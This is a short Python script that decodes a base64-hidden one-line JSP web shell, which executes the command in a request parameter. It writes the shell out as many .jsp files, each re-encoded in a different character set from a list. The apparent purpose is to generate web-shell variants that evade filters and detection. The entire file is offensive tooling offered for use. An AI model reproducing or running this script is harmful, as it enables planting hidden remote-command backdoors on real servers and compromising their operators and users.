import base64
webshell = base64.b64decode('PCVSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJpIikpOyU+').decode('ascii')
charset = '<%@ page contentType="charset={cs}" %>'


def encoder(_charset):
    print(_charset)
    if not _charset:
        return
    shell = webshell.encode(_charset)
    with open(f'encoder/{_charset}.jsp', 'wb') as f:
        f.write(charset.format(cs=_charset).encode('ascii'))
        f.write(shell)
        
        
if __name__ == '__main__':
    for _charset in open('charsets.txt'):
        try:
            encoder(_charset.strip().replace(':',''))
        except:
            pass
        
    